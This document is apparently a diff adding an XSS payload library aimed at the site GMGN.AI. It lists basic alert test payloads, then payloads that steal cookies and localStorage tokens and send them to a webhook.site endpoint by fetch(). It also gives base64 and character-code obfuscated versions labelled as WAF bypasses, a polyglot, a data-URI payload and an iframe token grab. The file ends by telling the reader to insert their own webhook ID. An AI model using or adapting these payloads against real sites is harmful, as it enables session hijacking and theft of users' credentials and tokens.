@@ -1,0 +1,30 @@
+# XSS PAYLOAD LIBRARY FOR GMGN.AI
+
+## SIMPLE TEST PAYLOADS
+{{7*7}}
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<script>alert(1)</script>
+
+## COOKIE THEFT
+<img src=x onerror="fetch('https://webhook.site/YOUR-ID?c='+document.cookie)">
+
+## LOCALSTORAGE THEFT (Full)
+<img src=x onerror="let t={};Object.keys(localStorage).forEach(k=>{if(k.includes('token'))t[k]=localStorage[k]});fetch('https://webhook.site/YOUR-ID',{method:'POST',body:JSON.stringify({tokens:t,cookies:document.cookie})})">
+
+## MINIFIED VERSION
+<img src=x onerror="eval(atob('ZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlL1lPVVItSUQiLHttZXRob2Q6IlBPU1QiLGJvZHk6SlNPTi5zdHJpbmdpZnkoe3Rva2VuczpPYmplY3Qua2V5cyhsb2NhbFN0b3JhZ2UpLmZpbHRlcihrPT5rLmluY2x1ZGVzKCJ0b2tlbiIpKS5tYXAoaz0+KHtrOmssdjpsb2NhbFN0b3JhZ2Vba119KSksY29va2llczpkb2N1bWVudC5jb29raWV9KX0p'))">
+
+## OBFUSCATED (Bypass WAF)
+<svg/onload=eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,89,79,85,82,45,73,68,39,44,123,109,101,116,104,111,100,58,39,80,79,83,84,39,44,98,111,100,121,58,74,83,79,78,46,115,116,114,105,110,103,105,102,121,40,123,116,111,107,101,110,115,58,79,98,106,101,99,116,46,107,101,121,115,40,108,111,99,97,108,83,116,111,114,97,103,101,41,44,99,111,111,107,105,101,115,58,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,125,41,125,41))>
+
+## POLYGLOT
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+## DATA URI
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
+## IFRAME SRCDOC
+<iframe srcdoc="<script>parent.postMessage({tokens:Object.keys(parent.localStorage).filter(k=>k.includes('token')).map(k=>({k,v:parent.localStorage[k]}))},parent.location.origin)</script>">
+
+Replace YOUR-ID with your webhook.site unique URL!
